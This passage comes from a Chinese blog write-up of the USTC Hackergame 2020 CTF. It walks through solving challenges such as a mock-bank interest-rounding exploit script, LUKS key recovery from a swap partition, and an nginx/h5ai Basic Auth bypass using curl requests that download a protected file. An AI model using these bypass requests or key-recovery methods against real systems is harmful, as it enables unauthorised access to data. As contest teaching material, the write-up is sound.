了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-06</div>\n</div>\n<div class=\"license-meta-item\">\n<div 